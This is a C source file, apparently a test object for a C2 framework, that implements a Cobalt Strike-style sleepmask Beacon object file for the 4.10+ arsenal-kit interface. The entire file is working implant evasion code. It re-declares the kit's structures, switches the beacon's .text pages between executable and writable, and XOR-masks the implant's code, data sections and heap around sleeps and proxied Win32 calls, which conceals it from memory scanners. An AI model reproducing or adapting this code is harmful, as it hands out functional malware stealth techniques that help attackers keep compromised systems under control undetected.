/* 4.10+ sleepmask contract (arsenal-kit beacon.h / beacon_gate.h). The
 * object the kit builds exports
 *
 *     void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL fc)
 *
 * and decides how to run every call Beacon hands it - the sleep itself and
 * each BeaconGate-proxied Win32 call - masking Beacon around it when
 * fc->bMask says so. This one does what the kit's default does: XOR the
 * beacon region's .text section and its writable sections plus the heap
 * records with info->mask, run the call, XOR again. It prints a line per
 * call and keeps no state (our beacon reloads the object per call).
 *
 * Live test: a BEACON_SLEEP_MASK hook hands this object over as the 4.10+
 * kit does (%(status => 1, result => bof_extract(obj, "sleep_mask")))).
 *
 * The structures are the kit's layouts, written out here so the object
 * compiles without the kit. Import shape follows bof_download.c. */
#include <windows.h>

EXTERN_C __declspec(dllimport) void __cdecl BeaconPrintf(int type, char * fmt, ...);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
WINBASEAPI DWORD  WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

#define CALLBACK_OUTPUT 0x00
#define MASK_SIZE 13

/* ---- the kit's BEACON_INFO (4.12 layout) ---- */
typedef struct { char * ptr; size_t size; } K_HEAP_RECORD;

enum { K_PURPOSE_EMPTY = 0, K_PURPOSE_GENERIC_BUFFER, K_PURPOSE_BEACON_MEMORY, K_PURPOSE_SLEEPMASK_MEMORY,
       K_PURPOSE_BOF_MEMORY, K_PURPOSE_UDC2_MEMORY };
enum { K_LABEL_EMPTY = 0, K_LABEL_BUFFER, K_LABEL_PEHEADER, K_LABEL_TEXT, K_LABEL_RDATA, K_LABEL_DATA,
       K_LABEL_PDATA, K_LABEL_RELOC };
enum { K_METHOD_UNKNOWN = 0, K_METHOD_VIRTUALALLOC, K_METHOD_HEAPALLOC, K_METHOD_MODULESTOMP, K_METHOD_NTMAPVIEW };

typedef struct { PVOID HeapHandle; BOOL DestroyHeap; } K_HEAPALLOC_INFO;
typedef struct { HMODULE ModuleHandle; } K_MODULESTOMP_INFO;
typedef union { K_HEAPALLOC_INFO HeapAllocInfo; K_MODULESTOMP_INFO ModuleStompInfo; PVOID Custom; } K_CLEANUP_INFO;
typedef struct { BOOL Cleanup; int AllocationMethod; K_CLEANUP_INFO AdditionalCleanupInformation; } K_CLEANUP;
typedef struct {
	int     Label;
	PVOID   BaseAddress;
	SIZE_T  VirtualSize;
	DWORD   CurrentProtect;
	DWORD   PreviousProtect;
	BOOL    MaskSection;
	DWORD   DripLoadPageSize;
} K_SECTION;
typedef struct {
	int        Purpose;
	PVOID      AllocationBase;
	SIZE_T     RegionSize;
	DWORD      Type;
	DWORD      DripLoadAllocationGranularity;
	K_SECTION  Sections[8];
	K_CLEANUP  CleanupInformation;
} K_REGION;
typedef struct { K_REGION AllocatedMemoryRegions[6]; } K_ALLOCATED_MEMORY;
typedef struct {
	unsigned int      version;
	char *            sleep_mask_ptr;
	DWORD             sleep_mask_text_size;
	DWORD             sleep_mask_total_size;
	char *            beacon_ptr;
	K_HEAP_RECORD *   heap_records;
	char              mask[MASK_SIZE];
	K_ALLOCATED_MEMORY allocatedMemory;
} K_BEACON_INFO;

/* ---- the kit's FUNCTION_CALL / WinApi ---- */
enum { K_INTERNETOPENA = 0, K_INTERNETCONNECTA, K_VIRTUALALLOC, K_VIRTUALALLOCEX, K_VIRTUALPROTECT,
       K_VIRTUALPROTECTEX, K_VIRTUALFREE, K_GETTHREADCONTEXT, K_SETTHREADCONTEXT, K_RESUMETHREAD,
       K_CREATETHREAD, K_CREATEREMOTETHREAD, K_OPENPROCESS, K_OPENTHREAD, K_CLOSEHANDLE,
       K_CREATEFILEMAPPINGA, K_MAPVIEWOFFILE, K_UNMAPVIEWOFFILE, K_VIRTUALQUERY, K_DUPLICATEHANDLE,
       K_READPROCESSMEMORY, K_WRITEPROCESSMEMORY, K_EXITTHREAD };
typedef struct {
	PVOID       functionPtr;
	int         function;      /* WinApi */
	int         numOfArgs;
	ULONG_PTR   args[10];
	BOOL        bMask;
	ULONG_PTR   retValue;
} K_FUNCTION_CALL;

#ifdef BIG
/* the region test: built with /DBIG=1 (CI: sleepmask410_big.x64.o), this
 * object is past the old 16K patch limit. It reaches a beacon only
 * through a region that grew (the x64 sleeve publishes 64K); the done
 * line carries its first byte and size, so a run proves it ran whole. */
static unsigned char g_pad[40000] = { 0x5a };
#endif

static void xor_range(char * p, SIZE_T n, const char * key)
{
	SIZE_T i;
	for (i = 0; i < n; i++)
		p[i] ^= key[i % MASK_SIZE];
}

/* the .text section of the beacon memory region (the kit's get_text_section) */
static K_SECTION * text_section(K_BEACON_INFO * info)
{
	int r, s;
	for (r = 0; r < 6; r++) {
		K_REGION * reg = &info->allocatedMemory.AllocatedMemoryRegions[r];
		if (reg->Purpose != K_PURPOSE_BEACON_MEMORY)
			continue;
		for (s = 0; s < 8; s++) {
			if (reg->Sections[s].Label == K_LABEL_TEXT)
				return &reg->Sections[s];
		}
	}
	return NULL;
}

/* the kit's mask_text_section: flip RX -> RW for the XOR, remember the old one */
static void xor_text(K_BEACON_INFO * info)
{
	K_SECTION * t = text_section(info);
	DWORD old = 0;

	if (t == NULL || t->BaseAddress == NULL || !t->MaskSection)
		return;
	if (t->CurrentProtect == PAGE_EXECUTE_READ) {
		if (!KERNEL32$VirtualProtect(t->BaseAddress, t->VirtualSize, PAGE_READWRITE, &old))
			return;
		t->CurrentProtect = PAGE_READWRITE;
		t->PreviousProtect = old;
	}
	xor_range((char *)t->BaseAddress, t->VirtualSize, info->mask);
}

static void restore_text(K_BEACON_INFO * info)
{
	K_SECTION * t = text_section(info);
	DWORD old = 0;

	if (t == NULL || t->BaseAddress == NULL || !t->MaskSection)
		return;
	if (t->CurrentProtect != PAGE_READWRITE)
		return;
	if (KERNEL32$VirtualProtect(t->BaseAddress, t->VirtualSize, t->PreviousProtect, &old)) {
		t->CurrentProtect = t->PreviousProtect;
		t->PreviousProtect = old;
	}
}

/* the kit's mask_sections: every flagged section that is already writable */
static void xor_writable(K_BEACON_INFO * info)
{
	int r, s;
	for (r = 0; r < 6; r++) {
		K_REGION * reg = &info->allocatedMemory.AllocatedMemoryRegions[r];
		if (reg->Purpose != K_PURPOSE_BEACON_MEMORY)
			continue;
		for (s = 0; s < 8; s++) {
			K_SECTION * sec = &reg->Sections[s];
			if (sec->BaseAddress == NULL || !sec->MaskSection || sec->Label == K_LABEL_TEXT)
				continue;
			if (sec->CurrentProtect == PAGE_READWRITE || sec->CurrentProtect == PAGE_EXECUTE_READWRITE)
				xor_range((char *)sec->BaseAddress, sec->VirtualSize, info->mask);
		}
	}
}

/* the kit's mask_heap */
static void xor_heap(K_BEACON_INFO * info)
{
	int a;
	if (info->heap_records == NULL)
		return;
	for (a = 0; info->heap_records[a].ptr != NULL; a++)
		xor_range(info->heap_records[a].ptr, info->heap_records[a].size, info->mask);
}

static void mask_beacon(K_BEACON_INFO * info)
{
	xor_writable(info);
	xor_heap(info);
	xor_text(info);
}

static void unmask_beacon(K_BEACON_INFO * info)
{
	/* XOR first, while the text pages are still writable, then put the
	 * protection back (the kit's unmask_text_section) */
	xor_text(info);
	restore_text(info);
	xor_heap(info);
	xor_writable(info);
}

/* the kit's BeaconGate: one exact call per arity */
static ULONG_PTR run_call(K_FUNCTION_CALL * fc)
{
	ULONG_PTR * a = fc->args;
	void * f = fc->functionPtr;

	switch (fc->numOfArgs) {
	case 0:  return ((ULONG_PTR (WINAPI *)())f)();
	case 1:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR))f)(a[0]);
	case 2:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR))f)(a[0], a[1]);
	case 3:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2]);
	case 4:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2], a[3]);
	case 5:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2], a[3], a[4]);
	case 6:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2], a[3], a[4], a[5]);
	case 7:  return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6]);
	default: return ((ULONG_PTR (WINAPI *)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR))f)(a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7]);
	}
}

void sleep_mask(K_BEACON_INFO * info, K_FUNCTION_CALL * fc)
{
	K_SECTION * t = text_section(info);
	int heap = 0, is_sleep;

	if (info == NULL || fc == NULL)
		return;
	if (info->heap_records != NULL) {
		while (info->heap_records[heap].ptr != NULL && heap < 512)
			heap++;
	}
	is_sleep = fc->functionPtr == (PVOID)KERNEL32$Sleep;

	/* Beacon API calls only while the image is in the clear */
	BeaconPrintf(CALLBACK_OUTPUT,
	             "sm410: call fn=%d mask=%d nargs=%d sleep=%d ver=%x beacon=%p text=%p/%lx prot=%lx regions=%x heap=%d",
	             fc->function, fc->bMask, fc->numOfArgs, is_sleep, info->version, info->beacon_ptr,
	             t ? t->BaseAddress : NULL, t ? (unsigned long)t->VirtualSize : 0, t ? t->CurrentProtect : 0,
	             (unsigned long)info->allocatedMemory.AllocatedMemoryRegions[0].Purpose, heap);

	if (fc->bMask)
		mask_beacon(info);

	/* "Beacon now calls directly into the beacon gate for Sleep": the kit's
	 * evasive-sleep option would be chosen here */
	fc->retValue = run_call(fc);

	if (fc->bMask)
		unmask_beacon(info);

#ifdef BIG
	BeaconPrintf(CALLBACK_OUTPUT, "sm410: done fn=%d ret=%llx pad=%x/%d", fc->function,
	             (unsigned long long)fc->retValue, g_pad[0], (int)sizeof(g_pad));
#else
	BeaconPrintf(CALLBACK_OUTPUT, "sm410: done fn=%d ret=%llx", fc->function, (unsigned long long)fc->retValue);
#endif
}
